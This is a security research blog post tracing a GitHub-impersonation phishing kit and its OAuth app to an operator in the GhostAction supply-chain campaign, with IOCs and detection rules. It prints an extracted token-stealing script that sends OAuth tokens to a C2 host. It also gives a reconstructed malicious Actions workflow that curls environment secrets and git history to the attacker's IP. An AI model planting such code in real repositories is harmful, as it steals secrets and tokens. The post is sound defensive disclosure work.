@@ -1,0 +1,467 @@
+---
+title: "Tracing GhostAction from email to operator"
+description: "A phishing email impersonating GitHub led to the operator's OAuth app, account, and 158 infected repos."
+date: 2026-10-10
+updated: 2026-10-11
+draft: false
+categories: ["security"]
+tags: ["phishing", "osint", "github", "ghostaction", "supply-chain", "oauth"]
+---
+
+import '../../../styles/ga.css';
+import AttackChain from '~/components/ga/AttackChain.astro';
+import InfraMap from '~/components/ga/InfraMap.astro';
+import PortMap from '~/components/ga/PortMap.astro';
+import Operator from '~/components/ga/Operator.astro';
+import Waves from '~/components/ga/Waves.astro';
+
+On October 10, 2026 I received a phishing email from `security@my-github[.]com`.
+The domain was registered 29 hours earlier.
+I looked up the origin IP, browsed to it with a test token, and captured the phishing page before the server blocked me.
+Inside the page source: an OAuth device flow script with a hardcoded Client ID that pointed straight to the operator's GitHub account.
+The infrastructure belongs to [GhostAction](https://blog.gitguardian.com/ghostaction-campaign-3-325-secrets-stolen/), a supply-chain campaign that injects malicious GitHub Actions workflows into public repos to steal CI/CD secrets.
+Active since September 2025, it has compromised over 3,000 repositories across five waves.
+The operator account and OAuth app behind this wave had not been publicly documented.
+
+<aside class="ga-note not-prose">
+  <p class="ga-eyebrow">Disclosure</p>
+  <p>Reported to GitHub on October 10 at 18:44 UTC. The domain and its link to <code>193[.]32[.]204[.]199</code> were first published by <a href="https://opensourcemalware.com/blog/ghostaction-attack-escalates">OpenSourceMalware</a> on October 9. The kit internals, the OAuth app and the operator account are new.</p>
+</aside>
+
+## The email
+
+Near-perfect clone of a GitHub security alert.
+Same Primer CSS, same layout.
+Two tells: the sender domain and the 29-hour registration.
+
+![Phishing email received from security@my-github.com](/images/ghostaction/01-phishing-email.png)
+
+| Detail | Value | Notes |
+|---|---|---|
+| Sender | `security@my-github[.]com` | Registered Oct 9 at Dynadot |
+| Email auth | none configured | no SPF record, no DKIM selectors, no DMARC policy (only TXT is a Google site verification) |
+| Claimed location | Moscow, Russia | Fabricated for urgency |
+| Claimed IP | `95.176.135.120` | Slovenian residential (SIOL), rDNS: `BSN-176-135-120.dynamic.siol.net` |
+| Tracking URL | `hxxps://my-github[.]com/YbsnK0bU` | 8-char token per recipient |
+| Domain age | 29 hours at time of email | see operator timeline below |
+
+## The infrastructure
+
+`my-github[.]com` sits behind Cloudflare. Origin: `193[.]32[.]204[.]199`. Mail relay: `193[.]32[.]204[.]3`.
+
+<InfraMap />
+
+### Phishing server: 193[.]32[.]204[.]199
+
+RIPE WHOIS: allocated to "Vigilant Cyber SAS" at "12 Rue de la Securite, Paris" (literally "12 Security Street").
+The IP block was sub-allocated by [Hop Bilisim Teknolojileri A.S.](https://www.hopbilisim.com.tr/), a Local Internet Registry in Istanbul that manages 136 RIPE objects and routinely sub-allocates /24 blocks to shell organizations.
+Transit via [M247](https://m247.com/) (Romania), peered through Finland (hence GeoIP resolving to Helsinki).
+
+[AbuseIPDB](https://www.abuseipdb.com/check/193.32.204.199): 100% abuse confidence, 5,007 reports, 957 distinct reporters.
+
+<PortMap />
+
+### Mail relay: 193[.]32[.]204[.]3
+
+Runs [FASTPANEL](https://fastpanel.direct/) with [Exim 4.97](https://www.exim.org/). SMTP TLS certificate:
+
+```text title="SMTP TLS certificate on .3" frame="code"
+C=EE, ST=Tallinn, L=Tallinn, O=CompanyName, OU=User, CN=etc
+Issued: 2026-09-04
+```
+
+Tallinn, not Paris.
+Issued September 4, same day as the FASTPANEL self-signed cert.
+Different SSH host keys on `.199` and `.3` confirm separate VMs.
+
+### Subnet co-tenants
+
+`slon7[.]com` on `.7-.9`: crypto-drainer (suspended).
+`mega[.]reviews` on `.10-.11`: parked.
+Phishing + C2 at `.199`, mail relay at `.3`.
+
+## The phishing kit
+
+Browsed to the phishing URL with a test token and saved the page before the server blacklisted my IP.
+
+| Property | Value |
+|---|---|
+| Size | 51,759 bytes |
+| Frontend | React + GitHub Primer CSS, all themes |
+| Feature flags | 100+ `data-feature-*` attributes (matching real GitHub) |
+| Backend | Python 3.10 `BaseHTTPServer` (from server headers) |
+| Framework | Custom (not [Evilginx](https://github.com/kgretzky/evilginx2) or [Modlishka](https://github.com/drk1wi/Modlishka)) |
+| Stealer script | 3,334 bytes, 13th `<script>` tag |
+
+The kit splits across three subdomains: `github.my-github[.]com` proxies the login (79 requests), `api.my-github[.]com` proxies API calls, and `collector.my-github[.]com` receives exfiltrated data ([CIRCL Lookyloo capture](https://lookyloo.circl.lu/)).
+The login form POSTs to `/session` on the proxy, which relays to real `github.com` (adversary-in-the-middle).
+The victim authenticates against the real backend, MFA included.
+
+After login, the stealer script polls the DOM for the victim's avatar to confirm authentication, waits 3 seconds, then abuses the [OAuth device flow](https://docs.github.com/en/apps/oauth-apps/building-oauth-apps/authorizing-oauth-apps#device-flow).
+The kit automates the entire flow inside the victim's already-authenticated session:
+
+```js title="Extracted token stealer (script 13, 3334 bytes)" frame="code"
+var CID = "Ov23ctrqCqZ79UaYKwyq";
+
+// Step 1: request device code
+fetch("/login/device/code", {
+  method: "POST",
+  body: "client_id=" + CID + "&scope=repo+workflow+read:org",
+  headers: {
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Accept": "application/json"
+  },
+  credentials: "same-origin",
+})
+
+// Steps 2-4: auto-fill user_code, auto-approve authorization
+// (victim's authenticated session handles consent silently)
+
+// Step 5: exfiltrate token to C2
+fetch("hxxps://my-github[.]com:8443/t?value=" + td.access_token
+  + "&user=" + encodeURIComponent(vu), { mode: "no-cors" });
+```
+
+<AttackChain />
+
+### Cloaking
+
+Without a valid 8-char tracking token: `no-referrer` redirect to `github.com`.
+From Tor exit nodes: same redirect.
+After repeated requests from the same IP: connection dropped entirely.
+
+```html title="Default response for non-victims" frame="code"
+<html><head>
+  <meta name='referrer' content='no-referrer'>
+  <script>top.location.href='https://github.com';</script>
+</head></html>
+```
+
+## The operator
+
+The Client ID hardcoded in the stealer script (`Ov23ctrqCqZ79UaYKwyq`) is a registered [GitHub OAuth App](https://docs.github.com/en/apps/oauth-apps/building-oauth-apps/differences-between-github-apps-and-oauth-apps).
+Looking it up on GitHub's authorization page reveals both the app and its owner:
+
+<Operator />
+
+![OAuth consent page showing CI Notifier by ookefokzkoed](/images/ghostaction/02-oauth-app-ci-notifier.png)
+
+Callback `devtools-ci[.]com` has never been registered (no DNS, no cert on crt.sh).
+The app was still issuing device codes at 15:49 UTC, over an hour after my email.
+
+### Attribution signals
+
+The username `ookefokzkoed` is a keyboard mash: no dictionary words, no leet-speak pattern, just fingers hitting keys fast to generate a throwaway handle.
+But which keys depends on the keyboard layout.
+The string contains `z` twice.
+On [QWERTY](https://en.wikipedia.org/wiki/QWERTY), `z` sits on the bottom row, a deliberate reach away from the home keys.
+On [AZERTY](https://en.wikipedia.org/wiki/AZERTY) (France/Belgium), `z` is on the top row, position 2, right under the fingers.
+Every character in the username maps to the top or home row of AZERTY:
+
+<div class="ga-kbd not-prose" aria-label="AZERTY vs QWERTY keyboard comparison showing that all letters in ookefokzkoed fall on the top and home rows of AZERTY">
+  <div class="ga-kbd-layout">
+    <p class="ga-kbd-label">AZERTY (France/Belgium)</p>
+    <div class="ga-kbd-row top">
+      <span class="ga-kbd-key">A</span>
+      <span class="ga-kbd-key hit">Z</span>
+      <span class="ga-kbd-key hit">E</span>
+      <span class="ga-kbd-key">R</span>
+      <span class="ga-kbd-key">T</span>
+      <span class="ga-kbd-key">Y</span>
+      <span class="ga-kbd-key">U</span>
+      <span class="ga-kbd-key">I</span>
+      <span class="ga-kbd-key hit">O</span>
+      <span class="ga-kbd-key">P</span>
+    </div>
+    <div class="ga-kbd-row home">
+      <span class="ga-kbd-key">Q</span>
+      <span class="ga-kbd-key">S</span>
+      <span class="ga-kbd-key hit">D</span>
+      <span class="ga-kbd-key hit">F</span>
+      <span class="ga-kbd-key">G</span>
+      <span class="ga-kbd-key">H</span>
+      <span class="ga-kbd-key">J</span>
+      <span class="ga-kbd-key hit">K</span>
+      <span class="ga-kbd-key">L</span>
+      <span class="ga-kbd-key">M</span>
+    </div>
+    <div class="ga-kbd-row bottom">
+      <span class="ga-kbd-key">W</span>
+      <span class="ga-kbd-key">X</span>
+      <span class="ga-kbd-key">C</span>
+      <span class="ga-kbd-key">V</span>
+      <span class="ga-kbd-key">B</span>
+      <span class="ga-kbd-key">N</span>
+    </div>
+  </div>
+  <div class="ga-kbd-layout">
+    <p class="ga-kbd-label">QWERTY (international)</p>
+    <div class="ga-kbd-row top">
+      <span class="ga-kbd-key">Q</span>
+      <span class="ga-kbd-key">W</span>
+      <span class="ga-kbd-key hit">E</span>
+      <span class="ga-kbd-key">R</span>
+      <span class="ga-kbd-key">T</span>
+      <span class="ga-kbd-key">Y</span>
+      <span class="ga-kbd-key">U</span>
+      <span class="ga-kbd-key">I</span>
+      <span class="ga-kbd-key hit">O</span>
+      <span class="ga-kbd-key">P</span>
+    </div>
+    <div class="ga-kbd-row home">
+      <span class="ga-kbd-key">A</span>
+      <span class="ga-kbd-key">S</span>
+      <span class="ga-kbd-key hit">D</span>
+      <span class="ga-kbd-key hit">F</span>
+      <span class="ga-kbd-key">G</span>
+      <span class="ga-kbd-key">H</span>
+      <span class="ga-kbd-key">J</span>
+      <span class="ga-kbd-key hit">K</span>
+      <span class="ga-kbd-key">L</span>
+    </div>
+    <div class="ga-kbd-row bottom">
+      <span class="ga-kbd-key miss">Z</span>
+      <span class="ga-kbd-key">X</span>
+      <span class="ga-kbd-key">C</span>
+      <span class="ga-kbd-key">V</span>
+      <span class="ga-kbd-key">B</span>
+      <span class="ga-kbd-key">N</span>
+      <span class="ga-kbd-key">M</span>
+    </div>
+  </div>
+  <div class="ga-kbd-legend">
+    <span><span class="swatch hit"></span> in username (top/home row)</span>
+    <span><span class="swatch miss"></span> Z on QWERTY (bottom row)</span>
+  </div>
+</div>
+
+On QWERTY, `z` is a bottom-row reach, inconsistent with home-row mashing.
+Keyboard layout as attribution is established: Mandiant's [APT1 report](https://www.mandiant.com/resources/apt1-exposing-one-of-chinas-cyber-espionage-units) used RDP keyboard metadata across 1,905 sessions.
+This is weaker (username characters, not system metadata), but the same principle.
+
+<div class="ga-tl not-prose" aria-label="Operator activity timeline from September 4 to October 10, all timestamps UTC">
+
+  <div class="ga-tl-phase">
+    <p class="ga-tl-phase-label">Infrastructure setup</p>
+    <div class="ga-tl-events">
+      <div class="ga-tl-ev is-infra">
+        <span class="ga-tl-date">Sep 4</span>
+        <span class="ga-tl-desc">SMTP + FASTPANEL certs issued on <code>.3</code> (Tallinn)</span>
+      </div>
+      <div class="ga-tl-ev is-infra">
+        <span class="ga-tl-date">Sep 10</span>
+        <span class="ga-tl-desc">GitHub account <code>ookefokzkoed</code> created</span>
+      </div>
+      <div class="ga-tl-ev is-infra">
+        <span class="ga-tl-date">mid-Sep</span>
+        <span class="ga-tl-desc">Single private contribution</span>
+      </div>
+      <div class="ga-tl-ev is-infra">
+        <span class="ga-tl-date">~Oct 7</span>
+        <span class="ga-tl-desc">OAuth app "CI Notifier" registered</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="ga-tl-gap">
+    <span class="ga-tl-gap-label">~48h</span>
+  </div>
+
+  <div class="ga-tl-phase">
+    <p class="ga-tl-phase-label">Domain standup <span class="ga-tl-duration">3h in one sitting</span></p>
+    <div class="ga-tl-events">
+      <div class="ga-tl-window">
+        <p class="ga-tl-window-label">CET 10:50 - 13:29 (late morning)</p>
+        <div class="ga-tl-ev is-hot">
+          <span class="ga-tl-date">Oct 9, 09:50</span>
+          <span class="ga-tl-desc"><code>my-github[.]com</code> registered at Dynadot</span>
+        </div>
+        <div class="ga-tl-ev is-hot">
+          <span class="ga-tl-date">Oct 9, 11:07</span>
+          <span class="ga-tl-desc">Cloudflare NS delegated</span>
+        </div>
+        <div class="ga-tl-ev is-hot">
+          <span class="ga-tl-date">Oct 9, 11:59</span>
+          <span class="ga-tl-desc">TLS certificate issued</span>
+        </div>
+        <div class="ga-tl-ev is-hot">
+          <span class="ga-tl-date">Oct 9, 12:29</span>
+          <span class="ga-tl-desc">Apache on <code>:8080</code> started</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="ga-tl-gap">
+    <span class="ga-tl-gap-label">~26h</span>
+  </div>
+
+  <div class="ga-tl-phase">
+    <p class="ga-tl-phase-label">Active phishing <span class="ga-tl-duration">29h after registration</span></p>
+    <div class="ga-tl-events">
+      <div class="ga-tl-window">
+        <p class="ga-tl-window-label">CET 15:01 - 16:49 (afternoon)</p>
+        <div class="ga-tl-ev is-hot">
+          <span class="ga-tl-date">Oct 10, 14:01</span>
+          <span class="ga-tl-desc">Latest infected repo committed (<code>mnfst/docs</code>)</span>
+        </div>
+        <div class="ga-tl-ev is-hot">
+          <span class="ga-tl-date">Oct 10, ~14:26</span>
+          <span class="ga-tl-desc">Phishing email received</span>
+        </div>
+        <div class="ga-tl-ev is-hot">
+          <span class="ga-tl-date">Oct 10, 15:49</span>
+          <span class="ga-tl-desc">App still issuing device codes</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+Other francophone signals:
+
+| Signal | Value |
+|---|---|
+| C2 parameter | `monami` ("mon ami", French) |
+| Earlier wave | `carte-avantage[.]com`, impersonating [SNCF](https://www.sncf.com/) (French railway) |
+| RIPE registration | Paris, "12 Rue de la Securite" (likely fabricated) |
+| SMTP cert | Tallinn (contradicts Paris) |
+
+No single signal is definitive.
+The francophone cluster (AZERTY, `monami`, SNCF) is the most consistent.
+The timeline activity window fits a European operator.
+
+## The campaign
+
+`193[.]32[.]204[.]199` has been active since at least August 2026 as GhostAction's primary C2.
+The phishing page is an escalation from passive workflow injection to active credential theft.
+
+<Waves />
+
+Wave 5 is self-sustaining: phishing steals OAuth tokens with `repo`+`workflow`+`read:org`.
+Tokens push malicious workflows.
+Workflows harvest secrets.
+Compromised accounts send more phishing.
+
+### The malicious workflow
+
+The workflows pushed to infected repos (`security-audit.yml`, `github_actions_security.yml`) run on every push and pull request.
+They dump every CI/CD secret and the full git history to the C2:
+
+```yaml title="Reconstructed security-audit.yml (from public reporting)" frame="code"
+name: Security Audit
+on: [push, pull_request]
+jobs:
+  audit:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0     # full git history
+
+      # exfil all env vars (includes GITHUB_TOKEN, API keys, deploy creds)
+      - run: |
+          curl -s "http://193[.]32[.]204[.]199/?c=monami" \
+            -d "$(env | base64)"
+
+      # exfil git history
+      - run: |
+          git log --all --oneline | \
+            curl -s "http://193[.]32[.]204[.]199/?c=new" -d @-
+
+      # structured exfil with repo identifier
+      - run: |
+          curl -s "http://193[.]32[.]204[.]199:3000/api/workflow/receive?inj=${{ github.repository }}" \
+            -d "$(env | grep -i secret | base64)"
+```
+
+### Still infected
+
+![GitHub code search showing 158 infected repos](/images/ghostaction/04-infected-repos-158.png)
+
+As of October 10, [`193.32.204 path:*/security-audit.yml`](https://github.com/search?q=193.32.204+path%3A*%2Fsecurity-audit.yml&type=code) returns **158 files** across public repos.
+Most recent: `mnfst/docs`, committed 14:01 UTC, 25 minutes before my email.
+
+## IOCs
+
+<figure class="ga-ioc not-prose">
+  <p class="ga-ioc-eyebrow">Indicators of compromise</p>
+  <table>
+    <tbody>
+      <tr><td>Operator</td><td><code>ookefokzkoed</code> (GitHub ID 327227770)</td></tr>
+      <tr><td>OAuth Client ID</td><td><code>Ov23ctrqCqZ79UaYKwyq</code></td></tr>
+      <tr><td>OAuth App</td><td>CI Notifier</td></tr>
+      <tr><td>Callback</td><td><code>devtools-ci[.]com</code> (non-existent)</td></tr>
+      <tr><td>Phishing domain</td><td><code>my-github[.]com</code> (Dynadot, Cloudflare)</td></tr>
+      <tr><td>C2</td><td><code>193[.]32[.]204[.]199</code> (AS153622 Madina IT, LIR: Hop Bilisim)</td></tr>
+      <tr><td>Mail relay</td><td><code>193[.]32[.]204[.]3</code> (Exim 4.97, FASTPANEL)</td></tr>
+      <tr><td>Shell org</td><td>Vigilant Cyber SAS, <code>vigilantcyber[.]top</code></td></tr>
+      <tr><td>Workflows</td><td><code>security-audit.yml</code>, <code>github_actions_security.yml</code></td></tr>
+      <tr><td>Exfil (secrets)</td><td><code>hxxp://193[.]32[.]204[.]199/?c=monami</code></td></tr>
+      <tr><td>Exfil (history)</td><td><code>hxxp://193[.]32[.]204[.]199/?c=new</code></td></tr>
+      <tr><td>Exfil (structured)</td><td><code>hxxp://193[.]32[.]204[.]199:3000/api/workflow/receive</code></td></tr>
+      <tr><td>Token exfil</td><td><code>hxxps://my-github[.]com:8443/t?value=&amp;user=</code></td></tr>
+      <tr><td>Collector</td><td><code>collector.my-github[.]com</code></td></tr>
+    </tbody>
+  </table>
+</figure>
+
+### Detection
+
+GitHub audit log query for organizations:
+
+```text title="Audit log filter" frame="code"
+action:oauth_application.access_granted oauth_application_name:"CI Notifier"
+```
+
+Check your local repos for malicious workflows:
+
+```bash title="Local detection" frame="code"
+# search workflow file contents for the C2 IP
+grep -r "193\.32\.204" .github/workflows/
+# find the known malicious workflow filenames
+find .github/workflows -name "security-audit.yml" -o -name "github_actions_security.yml"
+```
+
+Network indicators for SIEM rules:
+
+```text title="Suricata-style signatures" frame="code"
+alert http any any -> 193.32.204.199 any (msg:"GhostAction C2 monami"; content:"/?c=monami"; sid:2026101001;)
+alert http any any -> 193.32.204.199 any (msg:"GhostAction C2 new"; content:"/?c=new"; sid:2026101002;)
+alert tls any any -> any any (msg:"GhostAction phish domain"; tls.sni; content:"my-github.com"; sid:2026101003;)
+```
+
+### Check your account
+
+1. Open [github.com/settings/applications](https://github.com/settings/applications)
+2. If "CI Notifier" or `Ov23ctrqCqZ79UaYKwyq` appears, revoke it
+3. Search your repos for `security-audit.yml` or `github_actions_security.yml` containing `193.32.204`
+4. If found: delete the workflow, rotate every secret the token had access to
+
+## Sources
+
+Campaign reporting
+
+- [GitGuardian: The GhostAction Campaign, 3,325 Secrets Stolen](https://blog.gitguardian.com/ghostaction-campaign-3-325-secrets-stolen/)
+- [StepSecurity: GhostAction Campaign](https://www.stepsecurity.io/blog/ghostaction-campaign-over-3-000-secrets-stolen-through-malicious-github-workflows)
+- [BleepingComputer: 3,325 secrets stolen](https://bleepingcomputer.com/news/security/hackers-steal-3-325-secrets-in-ghostaction-github-supply-chain-attack)
+- [BleepingComputer: PyPI invalidates tokens](https://bleepingcomputer.com/news/security/pypi-invalidates-tokens-stolen-in-ghostaction-supply-chain-attack)
+- [SecurityWeek: Hundreds of repos](https://www.securityweek.com/github-workflows-attack-affects-hundreds-of-repos-thousands-of-secrets/)
+- [SecurityBoulevard: Tracking GhostAction 2025-2026](https://securityboulevard.com/2026/10/the-campaign-that-never-stopped-tracking-ghostaction-from-2025-to-2026/)
+- [OpenSourceMalware: Attack Escalates](https://opensourcemalware.com/blog/ghostaction-attack-escalates)
+- [Wiz: GhostAction Campaign](https://threats.wiz.io/all-incidents/ghostaction-campaign)
+- [Infosecurity Magazine](https://www.infosecurity-magazine.com/news/ghostaction-supply-chain-3000/)
+
+Infrastructure intelligence
+
+- [AbuseIPDB: 193[.]32[.]204[.]199](https://www.abuseipdb.com/check/193.32.204.199) - 5,007 reports, 100% abuse confidence
+- [Shodan InternetDB](https://internetdb.shodan.io/) - port and service fingerprints
+- [crt.sh](https://crt.sh/?q=my-github.com) - Certificate Transparency logs
+- [RIPE Database](https://apps.db.ripe.net/) - WHOIS for AS153622, Hop Bilisim
+- [CIRCL Lookyloo](https://lookyloo.circl.lu/) - domain tree capture
+
+Technical references
+
+- [GitHub: OAuth device flow](https://docs.github.com/en/apps/oauth-apps/building-oauth-apps/authorizing-oauth-apps#device-flow)
+- [MITRE ATT&CK](https://attack.mitre.org/) - T1078.004, T1195.002, T1552.001, T1071.001, T1041
